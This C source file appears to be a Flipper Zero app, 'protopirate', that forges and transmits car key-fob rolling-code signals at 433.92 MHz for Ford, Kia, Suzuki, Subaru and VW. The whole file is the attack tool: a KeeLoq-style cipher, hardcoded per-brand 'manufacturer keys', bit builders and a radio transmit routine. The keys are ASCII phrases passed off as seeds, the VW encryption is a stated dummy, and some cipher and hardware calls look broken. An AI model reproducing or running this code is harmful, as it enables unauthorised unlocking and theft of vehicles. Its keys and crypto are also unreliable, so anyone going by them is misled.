#include "protopirate_app_i.h"
#include <furi_hal.h>
#include <lib/subghz/subghz_protocol.h>

// --- KRYPTO LOGIK (KEELOQ) ---
#define K_NLF 0x3A5C742E

uint32_t keeloq_encrypt(uint32_t data, uint64_t key) {
    uint32_t x = data;
    for (uint16_t i = 0; i < 528; i++) {
        uint8_t bit = (x & 1) ^ ((x >> 15) & 1) ^ ((x >> 30) & 1) ^ ((x >> 25) & 1);
        bit ^= (uint8_t)((key >> (i & 63)) & 1);
        bit ^= (uint8_t)((K_NLF >> (((x >> 30) & 2) | ((x >> 25) & 4) | ((x >> 19) & 8) | ((x >> 8) & 16) | (x & 1))) & 1);
        x = (x >> 1) | ((uint32_t)bit << 31);
    }
    return x;
}

// --- HERSTELLER-SPEZIFISCHE SCHLÜSSEL (KDF) ---
uint64_t get_man_key(uint32_t serial, const char* brand) {
    if(strcmp(brand, "Ford") == 0) return 0x464F524420464F42; // "FORD FOB" Seed
    if(strcmp(brand, "Kia") == 0)  return 0x534B594E45542031; // "SKYNET 1" Seed
    if(strcmp(brand, "Suzuki") == 0) return 0x214153554B490000; // "ASUKI" Seed
    if(strcmp(brand, "Subaru") == 0) return 0x5355424152550000; // "SUBARU" Seed
    return 0x0000000000000000;
}

// --- BIT-ENGINE FÜR PWM (Ford, Kia, Suzuki, Subaru) ---
void build_hcs301_bits(uint32_t serial, uint16_t counter, uint8_t btn, uint64_t man_key, uint8_t* out) {
    uint32_t hopping = counter | ((serial & 0x3FF) << 16) | (btn << 28);
    uint32_t encrypted = keeloq_encrypt(hopping, man_key);
    for(int i=0; i<32; i++) out[i] = (encrypted >> i) & 1;
    for(int i=0; i<28; i++) out[32+i] = (serial >> i) & 1;
    for(int i=0; i<4; i++)  out[60+i] = (btn >> i) & 1;
    out[64] = 0; out[65] = 0; // Status bits
}

// --- BIT-ENGINE FÜR MANCHESTER (VW / VAG) ---
// VW nutzt 80 Bits und Manchester Codierung
void build_vw_bits(uint32_t serial, uint16_t counter, uint8_t btn, uint8_t* out) {
    // Vereinfachte VAG Logik für 80 Bit Pakete
    for(int i=0; i<32; i++) out[i] = (serial >> i) & 1;
    for(int i=0; i<16; i++) out[32+i] = (counter >> i) & 1;
    for(int i=0; i<32; i++) out[48+i] = (serial >> (i%8)) & 1; // Dummy Encrypted
}

// --- SIGNAL GENERATOR (TIMINGS) ---
LevelDuration* generate_signal(uint8_t* bits, size_t count, uint32_t te, bool is_manchester, size_t* out_count) {
    size_t max_edges = count * 2 + 30;
    LevelDuration* sig = malloc(sizeof(LevelDuration) * max_edges);
    size_t idx = 0;

    // Preamble
    for(int i=0; i<10; i++) {
        sig[idx++] = level_duration_make(true, te);
        sig[idx++] = level_duration_make(false, te);
    }
    sig[idx++] = level_duration_make(false, te * 10); // Sync Pause

    for(size_t i=0; i<count; i++) {
        if(is_manchester) {
            // Manchester: 0 -> Low-High, 1 -> High-Low
            sig[idx++] = level_duration_make(!bits[i], te);
            sig[idx++] = level_duration_make(bits[i], te);
        } else {
            // PWM: 0 -> Lang High (2Te), Kurz Low (1Te) | 1 -> Kurz High, Lang Low
            sig[idx++] = level_duration_make(true, bits[i] ? te : 2*te);
            sig[idx++] = level_duration_make(false, bits[i] ? 2*te : te);
        }
    }
    *out_count = idx;
    return sig;
}

// --- HAUPTFUNKTION: SENDEN ---
void protopirate_tx_execute(uint32_t serial, uint16_t counter, uint8_t btn, const char* brand) {
    uint8_t bits[80];
    size_t bit_count = 66;
    uint32_t te = 400;
    bool manchester = false;

    if(strcmp(brand, "VW") == 0) {
        build_vw_bits(serial, counter, btn, bits);
        bit_count = 80; te = 640; manchester = true;
    } else {
        uint64_t m_key = get_man_key(serial, brand);
        build_hcs301_bits(serial, counter, btn, m_key, bits);
        if(strcmp(brand, "Kia") == 0) te = 340;
        if(strcmp(brand, "Suzuki") == 0) te = 320;
    }

    size_t sig_size = 0;
    LevelDuration* signal = generate_signal(bits, bit_count, te, manchester, &sig_size);

    // Hardware TX
    furi_hal_subghz_reset();
    furi_hal_subghz_load_preset(FuriHalSubGhzPresetFhss650);
    furi_hal_subghz_set_frequency(433920000);

    if(furi_hal_subghz_tx()) {
        furi_hal_subghz_write_packet(signal, sig_size);
        furi_hal_subghz_flush_tx();
    }
    furi_hal_subghz_set_ne_rx();
    free(signal);
}
